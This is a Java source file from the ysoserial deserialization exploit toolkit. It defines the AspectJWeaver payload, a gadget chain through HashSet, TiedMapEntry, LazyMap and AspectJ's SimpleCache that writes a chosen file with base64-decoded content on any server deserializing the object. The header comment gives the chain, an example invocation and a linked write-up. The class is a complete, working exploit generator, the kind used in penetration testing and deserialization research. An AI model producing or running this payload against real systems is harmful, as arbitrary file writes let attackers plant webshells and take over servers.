package ysoserial.payloads;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
Gadget chain:
HashSet.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                    LazyMap.get()
                        SimpleCache$StorableCachingMap.put()
                            SimpleCache$StorableCachingMap.writeToPath()
                                FileOutputStream.write()

Usage:
args = "<filename>;<base64 content>"
Example:
java -jar ysoserial.jar AspectJWeaver "ahi.txt;YWhpaGloaQ=="

More information:
https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
 */
@PayloadTest(skip="non RCE")
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
@Authors({ Authors.JANG })

public class AspectJWeaver implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {
        int sep = command.lastIndexOf(';');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
        }
        String[] parts = command.split(";");
        String filename = parts[0];
        byte[] content = Base64.decodeBase64(parts[1]);

        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object simpleCache = ctor.newInstance(".", 12);
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;

    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"ahi.txt;YWhpaGloaQ=="};
        PayloadRunner.run(AspectJWeaver.class, args);
    }
}
